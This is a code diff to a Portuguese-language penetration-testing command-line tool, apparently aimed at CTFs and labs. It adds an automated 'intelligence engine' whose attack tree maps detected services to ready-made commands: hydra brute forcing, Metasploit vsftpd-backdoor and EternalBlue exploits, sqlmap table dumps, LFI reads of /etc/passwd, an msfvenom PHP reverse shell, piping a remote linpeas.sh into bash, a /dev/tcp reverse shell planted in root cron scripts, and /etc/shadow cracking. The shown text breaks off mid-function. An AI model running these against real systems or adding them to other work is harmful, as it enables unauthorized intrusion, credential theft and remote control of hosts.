@@ -19,6 +19,8 @@ from rich.columns import Columns
 
 console = Console()
 
+INTEL_OK = True
+
 PHASE_COLORS = ["cyan","green","magenta","yellow","red","bright_red","blue"]
 
 # ── Ferramentas executáveis por fase ────────────────────────
@@ -176,6 +178,33 @@ TOOL_DEFINITIONS = {
                 {"key": "output",   "label": "Ficheiro output",                    "default": "ferox_{TARGET}.txt"},
             ],
             "cmd": "feroxbuster -u {url} -w {wordlist} -x {ext} -d {depth} -o {output}",
+        },
+        {
+            "name": "ffuf",
+            "desc": "Fuzzing rápido de directorias, parâmetros e vhosts",
+            "hints": [
+                "💡 FFUF é o fuzzer mais rápido — ideal para CTFs e labs",
+                "💡 Usa FUZZ como placeholder na URL onde queres fazer fuzzing",
+                "💡 Exemplo directorias: http://alvo/FUZZ",
+                "💡 Exemplo parâmetros: http://alvo/page.php?id=FUZZ",
+                "💡 Exemplo vhosts: usa -H 'Host: FUZZ.dominio.com' com -w subdomains.txt",
+                "💡 -fc 404 filtra respostas 404 (não encontrado)",
+                "💡 -fc 403,404 filtra múltiplos códigos",
+                "💡 -mc 200 mostra só respostas 200 (OK)",
+                "💡 -t 50 define 50 threads (mais rápido, mais ruído)",
+                "💡 Wordlists recomendadas:",
+                "     /usr/share/wordlists/dirb/common.txt  (rápida)",
+                "     /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt (completa)",
+            ],
+            "params": [
+                {"key": "url",      "label": "URL com FUZZ (ex: http://192.168.1.1/FUZZ)", "default": "http://{TARGET}/FUZZ"},
+                {"key": "wordlist", "label": "Wordlist",                                    "default": "/usr/share/wordlists/dirb/common.txt"},
+                {"key": "ext",      "label": "Extensões (ex: php,html,txt — ENTER para saltar)", "default": ""},
+                {"key": "fc",       "label": "Filtrar códigos HTTP (ex: 404 ou 403,404)",   "default": "404"},
+                {"key": "threads",  "label": "Threads (velocidade)",                         "default": "40"},
+                {"key": "output",   "label": "Ficheiro output",                              "default": "ffuf_{TARGET}.txt"},
+            ],
+            "cmd": "ffuf -u {url} -w {wordlist} -e {ext} -fc {fc} -t {threads} -o {output}",
         },
         {
             "name": "dirb",
@@ -688,6 +717,7 @@ def main_menu():
         menu.add_row("[2]",   "Carregar Projecto")
         menu.add_row("[3-9]", "Entrar numa fase (3=Fase1 … 9=Fase7)")
         menu.add_row("[R]",   "Gerar Relatório")
+        menu.add_row("[I]",   "Motor de Inteligência — detectar e atacar vectores")
         menu.add_row("[Q]",   "Sair")
         console.print(menu)
 
@@ -698,6 +728,16 @@ def main_menu():
         elif ch == "1": new_project()
         elif ch == "2": load_project_menu()
         elif ch == "R": report_menu()
+        elif ch == "I":
+            if INTEL_OK:
+                if not PROJECT["name"]:
+                    console.print("[yellow]Cria ou carrega um projecto primeiro.[/yellow]")
+                    pause()
+                else:
+                    intelligence_menu(PROJECT, save_project)
+            else:
+                console.print("[red]Motor de inteligência não disponível.[/red]")
+                pause()
         elif ch in [str(i) for i in range(3, 10)]:
             phase_menu(int(ch) - 2)
 
@@ -1103,6 +1143,964 @@ def generate_pdf_report():
     doc.build(story, onFirstPage=dark_bg, onLaterPages=dark_bg)
     console.print(f"\n[green]✔ PDF gerado:[/green] [bold]{fname}[/bold]")
     pause()
+
+
+# ═══════════════════════════════════════════════════════════
+#  MOTOR DE INTELIGÊNCIA — Vectores e Árvore de Decisão
+# ═══════════════════════════════════════════════════════════
+
+ATTACK_TREE = {
+
+    # ── FTP ─────────────────────────────────────────────────
+    "ftp": {
+        "label": "FTP",
+        "color": "cyan",
+        "icon": "📁",
+        "detect": lambda ports, banners: any(
+            p in ports for p in ["21"]) or "ftp" in banners.lower(),
+        "attacks": [
+            {
+                "name": "Acesso anónimo",
+                "desc": "Testa login FTP sem credenciais (anonymous)",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "ftp -n {alvo} <<EOF\nquote USER anonymous\nquote PASS anonymous@\nls\nEOF",
+                "simple_cmd": "ftp {alvo}",
+                "followup": {
+                    "success": ["ftp_list_files", "ftp_download"],
+                    "fail":    ["ftp_brute", "ftp_exploit_version"]
+                },
+                "hints": "Quando ligar: user=anonymous  pass=(qualquer email ou vazio)"
+            },
+            {
+                "name": "Brute force FTP (hydra)",
+                "desc": "Ataque de dicionário às credenciais FTP",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",          "default": "{TARGET}"},
+                    {"key": "user",     "label": "Utilizador",        "default": "admin"},
+                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} ftp://{alvo}",
+                "followup": {
+                    "success": ["ftp_login_creds"],
+                    "fail":    ["ftp_exploit_version"]
+                },
+                "hints": "Se tiveres lista de users: substitui -l por -L users.txt"
+            },
+            {
+                "name": "Exploit vsftpd 2.3.4 backdoor",
+                "desc": "CVE backdoor famoso no vsftpd 2.3.4 — dá shell root",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {alvo}; run'",
+                "followup": {
+                    "success": ["privesc_tree"],
+                    "fail":    ["ftp_brute"]
+                },
+                "hints": "Só funciona se a versão for exactamente vsftpd 2.3.4"
+            },
+            {
+                "name": "Listar ficheiros FTP",
+                "desc": "Após acesso — listar e descarregar ficheiros",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                    {"key": "user", "label": "Utilizador", "default": "anonymous"},
+                    {"key": "pass_", "label": "Password",  "default": "anonymous"},
+                ],
+                "cmd": "ftp -n {alvo} <<EOF\nuser {user} {pass_}\nls -la\nbinary\nmget *\nEOF",
+                "followup": {"success": ["analyse_files"], "fail": []},
+                "hints": "mget * descarrega todos os ficheiros. Cuidado com tamanho."
+            },
+            {
+                "name": "Searchsploit FTP",
+                "desc": "Procurar exploits para a versão FTP encontrada",
+                "params": [
+                    {"key": "servico", "label": "Serviço/versão (ex: vsftpd 2.3.4)", "default": "vsftpd"},
+                ],
+                "cmd": "searchsploit {servico}",
+                "followup": {"success": [], "fail": []},
+                "hints": "Copia o caminho do exploit e usa searchsploit -m <path>"
+            },
+        ]
+    },
+
+    # ── SSH ─────────────────────────────────────────────────
+    "ssh": {
+        "label": "SSH",
+        "color": "green",
+        "icon": "🔐",
+        "detect": lambda ports, banners: "22" in ports or "ssh" in banners.lower(),
+        "attacks": [
+            {
+                "name": "Brute force SSH (hydra)",
+                "desc": "Ataque de dicionário às credenciais SSH",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",         "default": "{TARGET}"},
+                    {"key": "user",     "label": "Utilizador",       "default": "root"},
+                    {"key": "wordlist", "label": "Wordlist",         "default": "/usr/share/wordlists/rockyou.txt"},
+                    {"key": "port",     "label": "Porto SSH",        "default": "22"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} -s {port} -t 4 ssh://{alvo}",
+                "followup": {
+                    "success": ["ssh_login", "privesc_tree"],
+                    "fail":    ["ssh_user_enum", "ssh_exploit_version"]
+                },
+                "hints": "Começa com users comuns: root, admin, www-data, ubuntu, kali"
+            },
+            {
+                "name": "Enumeração de utilizadores SSH",
+                "desc": "Tentar descobrir usernames válidos no servidor SSH",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "nmap -p 22 --script ssh-auth-methods,ssh-hostkey {alvo}",
+                "followup": {
+                    "success": ["ssh_brute_user"],
+                    "fail":    ["ssh_exploit_version"]
+                },
+                "hints": "Também podes usar: ssh-user-enum ou metasploit auxiliary/scanner/ssh/ssh_enumusers"
+            },
+            {
+                "name": "Login SSH com credenciais",
+                "desc": "Entrar no sistema com credenciais obtidas",
+                "params": [
+                    {"key": "user", "label": "Utilizador",  "default": ""},
+                    {"key": "alvo", "label": "IP alvo",     "default": "{TARGET}"},
+                    {"key": "port", "label": "Porto",       "default": "22"},
+                ],
+                "cmd": "ssh {user}@{alvo} -p {port}",
+                "followup": {
+                    "success": ["privesc_tree"],
+                    "fail":    ["ssh_key_auth"]
+                },
+                "hints": "Após entrar corre: sudo -l  e  id  para ver privilégios"
+            },
+            {
+                "name": "Exploit OpenSSH (searchsploit)",
+                "desc": "Procurar exploits para a versão SSH encontrada",
+                "params": [
+                    {"key": "versao", "label": "Versão OpenSSH (ex: 7.4)", "default": ""},
+                ],
+                "cmd": "searchsploit openssh {versao}",
+                "followup": {"success": [], "fail": []},
+                "hints": "Verifica a versão exacta no output do nmap (-sV)"
+            },
+        ]
+    },
+
+    # ── HTTP / WEB ───────────────────────────────────────────
+    "http": {
+        "label": "HTTP / Web",
+        "color": "yellow",
+        "icon": "🌐",
+        "detect": lambda ports, banners: any(
+            p in ports for p in ["80","443","8080","8443","8888"]) or "http" in banners.lower(),
+        "attacks": [
+            {
+                "name": "Nikto — scan vulnerabilidades web",
+                "desc": "Scanner automático de vulnerabilidades HTTP",
+                "params": [
+                    {"key": "alvo",  "label": "IP / URL alvo", "default": "{TARGET}"},
+                    {"key": "porto", "label": "Porto",         "default": "80"},
+                ],
+                "cmd": "nikto -h {alvo} -p {porto}",
+                "followup": {
+                    "success": ["web_sqli", "web_lfi", "web_upload"],
+                    "fail":    ["gobuster_enum"]
+                },
+                "hints": "Procura no output por: SQL injection, LFI, upload, default creds"
+            },
+            {
+                "name": "Gobuster — enumerar directorias",
+                "desc": "Descobrir ficheiros e pastas escondidas",
+                "params": [
+                    {"key": "url",      "label": "URL alvo",   "default": "http://{TARGET}"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/dirb/common.txt"},
+                    {"key": "ext",      "label": "Extensões",  "default": "php,html,txt,bak"},
+                ],
+                "cmd": "gobuster dir -u {url} -w {wordlist} -x {ext}",
+                "followup": {
+                    "success": ["web_analyse_dirs"],
+                    "fail":    ["feroxbuster_enum"]
+                },
+                "hints": "Atenção a: /admin, /backup, /config, /upload, .bak, .old"
+            },
+            {
+                "name": "Feroxbuster — enumerar recursivo",
+                "desc": "Fuzzing recursivo mais agressivo que gobuster",
+                "params": [
+                    {"key": "url",      "label": "URL alvo",          "default": "http://{TARGET}"},
+                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/dirb/common.txt"},
+                    {"key": "depth",    "label": "Profundidade",      "default": "3"},
+                ],
+                "cmd": "feroxbuster -u {url} -w {wordlist} -d {depth} -x php,html,txt",
+                "followup": {
+                    "success": ["web_analyse_dirs"],
+                    "fail":    ["web_sqli"]
+                },
+                "hints": "Mais lento mas encontra mais — usa após gobuster falhar"
+            },
+            {
+                "name": "FFUF — fuzzing rápido",
+                "desc": "Fuzzer ultra-rápido — directorias, parâmetros ou vhosts",
+                "params": [
+                    {"key": "url",      "label": "URL com FUZZ (ex: http://alvo/FUZZ)", "default": "http://{TARGET}/FUZZ"},
+                    {"key": "wordlist", "label": "Wordlist",                             "default": "/usr/share/wordlists/dirb/common.txt"},
+                    {"key": "fc",       "label": "Filtrar códigos (ex: 404)",            "default": "404"},
+                    {"key": "threads",  "label": "Threads",                              "default": "40"},
+                ],
+                "cmd": "ffuf -u {url} -w {wordlist} -fc {fc} -t {threads}",
+                "followup": {
+                    "success": ["web_analyse_dirs"],
+                    "fail":    ["web_sqli"]
+                },
+                "hints": "💡 Coloca FUZZ onde queres fazer fuzzing:\n   Directorias → http://alvo/FUZZ\n   Parâmetros  → http://alvo/page.php?id=FUZZ\n   Vhosts      → usa -H 'Host: FUZZ.dominio.com'\n   -fc 404 filtra not found  |  -mc 200 mostra só OK\n   Muito mais rápido que gobuster/feroxbuster"
+            },
+            {
+                "name": "WPScan — WordPress",
+                "desc": "Detectar WordPress e enumerar users/plugins vulneráveis",
+                "params": [
+                    {"key": "url",  "label": "URL WordPress", "default": "http://{TARGET}"},
+                    {"key": "enum", "label": "Enumeração",    "default": "u,vp,ap"},
+                ],
+                "cmd": "wpscan --url {url} -e {enum} --plugins-detection aggressive",
+                "followup": {
+                    "success": ["wp_brute", "wp_exploit_plugin"],
+                    "fail":    ["web_sqli"]
+                },
+                "hints": "u=users  vp=plugins vulneráveis  ap=todos os plugins"
+            },
+            {
+                "name": "SQLMap — SQL Injection",
+                "desc": "Testar e explorar SQL Injection automaticamente",
+                "params": [
+                    {"key": "url",   "label": "URL com parâmetro (ex: http://alvo/page?id=1)", "default": ""},
+                    {"key": "level", "label": "Nível (1-5)",   "default": "3"},
+                    {"key": "risk",  "label": "Risco (1-3)",   "default": "2"},
+                ],
+                "cmd": "sqlmap -u '{url}' --level={level} --risk={risk} --dbs --batch",
+                "followup": {
+                    "success": ["sqli_dump", "sqli_shell"],
+                    "fail":    ["web_lfi"]
+                },
+                "hints": "Encontrando DBs: adiciona --tables -D <db>  depois --dump -T <table>"
+            },
+            {
+                "name": "SQLMap — dump de tabela",
+                "desc": "Extrair dados de uma tabela específica",
+                "params": [
+                    {"key": "url",   "label": "URL vulnerável",  "default": ""},
+                    {"key": "db",    "label": "Base de dados",   "default": ""},
+                    {"key": "table", "label": "Tabela",          "default": "users"},
+                ],
+                "cmd": "sqlmap -u '{url}' -D {db} -T {table} --dump --batch",
+                "followup": {
+                    "success": ["crack_hashes"],
+                    "fail":    ["web_lfi"]
+                },
+                "hints": "Procura tabelas: users, accounts, admin, passwords, credentials"
+            },
+            {
+                "name": "LFI — Local File Inclusion",
+                "desc": "Testar inclusão de ficheiros locais no servidor",
+                "params": [
+                    {"key": "url", "label": "URL com parâmetro (ex: http://alvo/page?file=)", "default": ""},
+                ],
+                "cmd": "curl '{url}../../../etc/passwd'",
+                "followup": {
+                    "success": ["lfi_log_poison", "lfi_read_files"],
+                    "fail":    ["web_upload"]
+                },
+                "hints": "Tenta: ?file=  ?page=  ?include=  ?path=  ?lang=  ?template="
+            },
+            {
+                "name": "Upload de shell web",
+                "desc": "Fazer upload de reverse shell PHP para o servidor",
+                "params": [
+                    {"key": "url_upload", "label": "URL da página de upload", "default": ""},
+                    {"key": "lhost",      "label": "Teu IP",                  "default": ""},
+                    {"key": "lport",      "label": "Porta listener",          "default": "4444"},
+                ],
+                "cmd": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw > shell.php && echo 'Shell criada: shell.php — faz upload manual'",
+                "followup": {
+                    "success": ["nc_listener", "privesc_tree"],
+                    "fail":    ["web_sqli"]
+                },
+                "hints": "Após upload navega para http://alvo/uploads/shell.php com o listener activo"
+            },
+            {
+                "name": "Hydra — brute force HTTP form",
+                "desc": "Força bruta num formulário de login web",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",                       "default": "{TARGET}"},
+                    {"key": "path",     "label": "Path do login (ex: /login.php)","default": "/login.php"},
+                    {"key": "user",     "label": "Utilizador",                    "default": "admin"},
+                    {"key": "wordlist", "label": "Wordlist",                      "default": "/usr/share/wordlists/rockyou.txt"},
+                    {"key": "fail_str", "label": "String de falha (ex: Invalid)", "default": "Invalid"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} {alvo} http-post-form '{path}:username=^USER^&password=^PASS^:F={fail_str}'",
+                "followup": {
+                    "success": ["web_authenticated"],
+                    "fail":    ["web_sqli"]
+                },
+                "hints": "Inspecciona o HTML do form para ver os nomes dos campos (username/password)"
+            },
+        ]
+    },
+
+    # ── SMB ─────────────────────────────────────────────────
+    "smb": {
+        "label": "SMB / Samba",
+        "color": "magenta",
+        "icon": "🗄️",
+        "detect": lambda ports, banners: any(
+            p in ports for p in ["139","445"]) or "smb" in banners.lower() or "samba" in banners.lower(),
+        "attacks": [
+            {
+                "name": "enum4linux — enumeração completa",
+                "desc": "Enumerar utilizadores, partilhas e políticas SMB",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "enum4linux -a {alvo}",
+                "followup": {
+                    "success": ["smb_access_shares", "smb_brute"],
+                    "fail":    ["smb_nmap"]
+                },
+                "hints": "Procura: utilizadores, partilhas acessíveis, versão Samba"
+            },
+            {
+                "name": "smbclient — listar partilhas",
+                "desc": "Listar e aceder a partilhas SMB sem autenticação",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "smbclient -L //{alvo} -N",
+                "followup": {
+                    "success": ["smb_access_share_anon"],
+                    "fail":    ["smb_brute"]
+                },
+                "hints": "Partilhas interessantes: Users, Backup, Admin, Data, Share"
+            },
+            {
+                "name": "smbclient — aceder partilha",
+                "desc": "Entrar numa partilha SMB específica",
+                "params": [
+                    {"key": "alvo",    "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "share",   "label": "Nome da partilha","default": ""},
+                    {"key": "user",    "label": "Utilizador (-N para anon)", "default": "-N"},
+                ],
+                "cmd": "smbclient //{alvo}/{share} {user}",
+                "followup": {
+                    "success": ["smb_download_files"],
+                    "fail":    ["smb_brute"]
+                },
+                "hints": "Dentro da partilha: ls, get <ficheiro>, mget *"
+            },
+            {
+                "name": "EternalBlue — MS17-010",
+                "desc": "Exploit SMB crítico (Windows 7/2008 não patchado)",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",   "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",    "default": ""},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {alvo}; set LHOST {lhost}; run'",
+                "followup": {
+                    "success": ["privesc_tree", "dump_hashes"],
+                    "fail":    ["smb_brute"]
+                },
+                "hints": "Verifica primeiro: nmap --script smb-vuln-ms17-010 {alvo}"
+            },
+            {
+                "name": "Nmap SMB vulnerabilidades",
+                "desc": "Verificar CVEs SMB com scripts NSE",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "nmap -p 139,445 --script smb-vuln* {alvo}",
+                "followup": {
+                    "success": ["smb_eternal_blue", "smb_brute"],
+                    "fail":    []
+                },
+                "hints": "Procura: ms17-010 (EternalBlue), ms08-067, ms06-025"
+            },
+        ]
+    },
+
+    # ── SQL / Base de dados ──────────────────────────────────
+    "sql": {
+        "label": "SQL / Base de Dados",
+        "color": "bright_red",
+        "icon": "🗃️",
+        "detect": lambda ports, banners: any(
+            p in ports for p in ["3306","5432","1433","1521"]) or \
+            any(s in banners.lower() for s in ["mysql","postgres","mssql","oracle"]),
+        "attacks": [
+            {
+                "name": "MySQL — login sem password",
+                "desc": "Testar acesso MySQL root sem autenticação",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "mysql -h {alvo} -u root --password=''",
+                "followup": {
+                    "success": ["mysql_enum", "mysql_file_read"],
+                    "fail":    ["mysql_brute"]
+                },
+                "hints": "Tenta também: -u admin, -u mysql, -u sa"
+            },
+            {
+                "name": "MySQL — brute force",
+                "desc": "Força bruta às credenciais MySQL",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user",     "label": "Utilizador", "default": "root"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} {alvo} mysql",
+                "followup": {
+                    "success": ["mysql_enum"],
+                    "fail":    []
+                },
+                "hints": "Após acesso: show databases;  use <db>;  show tables;  select * from users;"
+            },
+            {
+                "name": "MySQL — ler ficheiros do sistema",
+                "desc": "Usar LOAD_FILE para ler ficheiros sensíveis",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user",     "label": "Utilizador", "default": "root"},
+                    {"key": "pass_",    "label": "Password",   "default": ""},
+                    {"key": "ficheiro", "label": "Ficheiro",   "default": "/etc/passwd"},
+                ],
+                "cmd": "mysql -h {alvo} -u {user} -p{pass_} -e \"SELECT LOAD_FILE('{ficheiro}');\"",
+                "followup": {"success": [], "fail": []},
+                "hints": "Também tenta: /etc/shadow, /var/www/html/config.php, wp-config.php"
+            },
+        ]
+    },
+
+    # ── Escalada de Privilégios ──────────────────────────────
+    "privesc": {
+        "label": "Escalada de Privilégios",
+        "color": "bright_red",
+        "icon": "⬆️",
+        "detect": lambda ports, banners: False,  # activado manualmente
+        "attacks": [
+            {
+                "name": "LinPEAS — enumeração automática",
+                "desc": "Ferramenta mais completa para encontrar vectores de escalada",
+                "params": [
+                    {"key": "lhost",  "label": "Teu IP (servidor HTTP)", "default": ""},
+                    {"key": "output", "label": "Ficheiro output",        "default": "linpeas.txt"},
+                ],
+                "cmd": "curl http://{lhost}/linpeas.sh | bash | tee {output}",
+                "followup": {
+                    "success": ["privesc_sudo", "privesc_suid", "privesc_cron", "privesc_caps"],
+                    "fail":    ["privesc_manual"]
+                },
+                "hints": "Serve o linpeas.sh com: python3 -m http.server 80 (na tua máquina)"
+            },
+            {
+                "name": "sudo -l — comandos sem password",
+                "desc": "Ver o que podes correr como root sem password",
+                "params": [],
+                "cmd": "sudo -l",
+                "followup": {
+                    "success": ["privesc_sudo_gtfobins"],
+                    "fail":    ["privesc_suid"]
+                },
+                "hints": "Com resultado: vai a gtfobins.github.io e procura o binário encontrado"
+            },
+            {
+                "name": "GTFObins — explorar sudo",
+                "desc": "Escalar com binário encontrado no sudo -l",
+                "params": [
+                    {"key": "binario", "label": "Binário encontrado (ex: vim, find, python)", "default": ""},
+                ],
+                "cmd": "echo 'Consulta: https://gtfobins.github.io/gtfobins/{binario}/#sudo'",
+                "simple_cmd": "sudo {binario} -c 'id; /bin/bash'",
+                "followup": {
+                    "success": ["root_shell"],
+                    "fail":    ["privesc_suid"]
+                },
+                "hints": "Exemplos:\n  sudo find . -exec /bin/bash \\;\n  sudo vim -c ':!/bin/bash'\n  sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
+            },
+            {
+                "name": "SUID — binários exploráveis",
+                "desc": "Encontrar binários SUID e explorar via GTFObins",
+                "params": [],
+                "cmd": "find / -perm -4000 2>/dev/null",
+                "followup": {
+                    "success": ["privesc_suid_exploit"],
+                    "fail":    ["privesc_cron"]
+                },
+                "hints": "Binários SUID comuns exploráveis: find, bash, python, vim, cp, cat, nmap"
+            },
+            {
+                "name": "SUID — explorar binário",
+                "desc": "Usar GTFObins para escalar com binário SUID encontrado",
+                "params": [
+                    {"key": "binario", "label": "Caminho completo do binário SUID", "default": ""},
+                ],
+                "cmd": "echo 'Ver: https://gtfobins.github.io/#'",
+                "simple_cmd": "{binario} -p",
+                "followup": {
+                    "success": ["root_shell"],
+                    "fail":    ["privesc_cron"]
+                },
+                "hints": "Exemplos:\n  /usr/bin/find . -exec /bin/bash -p \\;\n  /usr/bin/python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
+            },
+            {
+                "name": "Cron jobs — tarefas agendadas",
+                "desc": "Encontrar cron jobs que correm como root com scripts editáveis",
+                "params": [],
+                "cmd": "cat /etc/crontab; ls -la /etc/cron*; find / -name '*.sh' -writable 2>/dev/null",
+                "followup": {
+                    "success": ["privesc_cron_exploit"],
+                    "fail":    ["privesc_caps"]
+                },
+                "hints": "Se encontrares script writable que corre como root:\n  echo 'bash -i >& /dev/tcp/TUA_IP/4444 0>&1' >> script.sh"
+            },
+            {
+                "name": "Capabilities — binários especiais",
+                "desc": "Procurar binários com capabilities elevadas",
+                "params": [],
+                "cmd": "getcap -r / 2>/dev/null",
+                "followup": {
+                    "success": ["privesc_caps_exploit"],
+                    "fail":    ["privesc_path"]
+                },
+                "hints": "Perigoso: cap_setuid+ep, cap_net_raw+ep\nExemplo python3: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+            },
+            {
+                "name": "PATH Hijacking",
+                "desc": "Substituir binário no PATH por script malicioso",
+                "params": [
+                    {"key": "binario", "label": "Binário a hijack (ex: curl, wget)", "default": ""},
+                ],
+                "cmd": "echo $PATH; find / -writable -type d 2>/dev/null | head -20",
+                "followup": {
+                    "success": ["root_shell"],
+                    "fail":    ["privesc_kernel"]
+                },
+                "hints": "Se encontrares directoria writable no PATH:\n  echo '/bin/bash' > /tmp/{binario}\n  chmod +x /tmp/{binario}\n  export PATH=/tmp:$PATH"
+            },
+            {
+                "name": "Kernel exploit",
+                "desc": "Explorar vulnerabilidade no kernel Linux",
+                "params": [],
+                "cmd": "uname -a && cat /etc/os-release",
+                "followup": {
+                    "success": [],
+                    "fail":    []
+                },
+                "hints": "Com a versão do kernel: searchsploit linux kernel <versao>\nFerramentas: linux-exploit-suggester, linux-smart-enumeration"
+            },
+            {
+                "name": "Password reutilizada — /etc/passwd + shadow",
+                "desc": "Tentar ler shadow e crackear hashes",
+                "params": [],
+                "cmd": "cat /etc/shadow 2>/dev/null || cat /etc/passwd",
+                "followup": {
+                    "success": ["crack_shadow_hashes"],
+                    "fail":    ["privesc_kernel"]
+                },
+                "hints": "Se conseguires ler /etc/shadow:\n  unshadow /etc/passwd /etc/shadow > hashes.txt\n  john --wordlist=rockyou.txt hashes.txt"
+            },
+        ]
+    },
+
+    # ── Cracking de Hashes ───────────────────────────────────
+    "hashes": {
+        "label": "Cracking de Hashes",
+        "color": "yellow",
+        "icon": "🔓",
+        "detect": lambda ports, banners: False,
+        "attacks": [
+            {
+                "name": "John the Ripper",
+                "desc": "Crackear hashes com dicionário",
+                "params": [
+                    {"key": "hash_file","label": "Ficheiro com hash(es)", "default": "hash.txt"},
+                    {"key": "wordlist", "label": "Wordlist",              "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "john --wordlist={wordlist} {hash_file} && john --show {hash_file}",
+                "followup": {"success": [], "fail": ["hashcat"]},
+                "hints": "Para identificar o tipo: hash-identifier <hash>"
+            },
+            {
+                "name": "Hashcat — GPU cracking",
+                "desc": "Crackear hashes com GPU (mais rápido)",
+                "params": [
+                    {"key": "modo",     "label": "Modo: 0=MD5 100=SHA1 1800=sha512crypt 3200=bcrypt", "default": "0"},
+                    {"key": "hash_file","label": "Ficheiro com hash", "default": "hash.txt"},
+                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hashcat -m {modo} {hash_file} {wordlist}",
+                "followup": {"success": [], "fail": []},
+                "hints": "Para identificar modo: hashcat --example-hashes | grep -i <tipo>"
+            },
+            {
+                "name": "Unshadow + John",
+                "desc": "Combinar passwd+shadow e crackear",
+                "params": [
+                    {"key": "passwd",   "label": "Ficheiro /etc/passwd", "default": "/etc/passwd"},
+                    {"key": "shadow",   "label": "Ficheiro /etc/shadow", "default": "/etc/shadow"},
+                    {"key": "wordlist", "label": "Wordlist",             "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "unshadow {passwd} {shadow} > combined.txt && john --wordlist={wordlist} combined.txt",
+                "followup": {"success": [], "fail": []},
+                "hints": "Após crackear: john --show combined.txt"
+            },
+        ]
+    },
+}
+
+# ═══════════════════════════════════════════════════════════
+#  FUNÇÕES DO MOTOR DE INTELIGÊNCIA
+# ═══════════════════════════════════════════════════════════
+
+def detect_vectors(scan_output, target):
+    """Analisa output do nmap e devolve vectores detectados."""
+    ports_found = re.findall(r'(\d+)/tcp\s+open', scan_output)
+    ports_found += re.findall(r'(\d+)/udp\s+open', scan_output)
+    banners = scan_output.lower()
+
+    detected = []
+    for key, vector in ATTACK_TREE.items():
+        if key in ("privesc", "hashes"):
+            continue
+        try:
+            if vector["detect"](ports_found, banners):
+                detected.append(key)
+        except Exception:
+            pass
+    return detected, ports_found
+
+def intelligence_menu(project, save_fn, color="red"):
+    """Menu principal do motor de inteligência."""
+    target = project.get("target", "")
+
+    while True:
+        console.clear()
+        _banner_intel()
+
+        console.print(Panel(
+            f"[bold]Alvo:[/bold] [yellow]{target}[/yellow]",
+            title="[bold red]🧠 MOTOR DE INTELIGÊNCIA[/bold red]",
+            border_style="red", padding=(0,2)
+        ))
+        console.print()
+
+        # Menu de entrada
+        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
+        menu.add_column(style="bold cyan", width=6)
+        menu.add_column()
+        menu.add_row("[1]", "Analisar output do nmap (detectar vectores automaticamente)")
+        menu.add_row("[2]", "Escolher vector manualmente")
+        menu.add_row("[3]", "Escalada de Privilégios (após acesso inicial)")
+        menu.add_row("[4]", "Cracking de Hashes")
+        menu.add_row("[B]", "Voltar")
+        console.print(menu)
+        console.print()
+
+        ch = Prompt.ask("[bold red]REAPER › Intel[/bold red]").strip().upper()
+
+        if ch == "B":
+            break
+        elif ch == "1":
+            scan_output = _get_scan_output(project)
+            if scan_output:
+                _auto_detect_and_attack(scan_output, target, project, save_fn)
+        elif ch == "2":
+            _manual_vector_menu(target, project, save_fn)
+        elif ch == "3":
+            _attack_vector_menu("privesc", target, project, save_fn)
+        elif ch == "4":
+            _attack_vector_menu("hashes", target, project, save_fn)
+
+def _banner_intel():
+    from rich.align import Align
+    from rich.text import Text
+    console.print(Align.center(Text("[ REAPER — INTELLIGENCE ENGINE ]", style="bold red")))
+    console.print(Rule(style="red"))
+
+def _get_scan_output(project):
+    """Pede ao utilizador para colar ou carregar output do nmap."""
+    console.print()
+    console.print(Panel(
+        "[cyan]Cola aqui o output do nmap (ou caminho para ficheiro .txt)[/cyan]\n"
+        "[dim]Termina com uma linha que contenha apenas: FIM[/dim]",
+        border_style="cyan"
+    ))
+    console.print()
+
+    opt = Prompt.ask("[cyan]Opção[/cyan]\n  [1] Colar output directamente\n  [2] Carregar de ficheiro\n  [B] Cancelar\n\nEscolha").strip().upper()
+
+    if opt == "B":
+        return None
+    elif opt == "2":
+        path = Prompt.ask("[cyan]Caminho do ficheiro[/cyan]").strip()
+        try:
+            with open(path) as f:
+                return f.read()
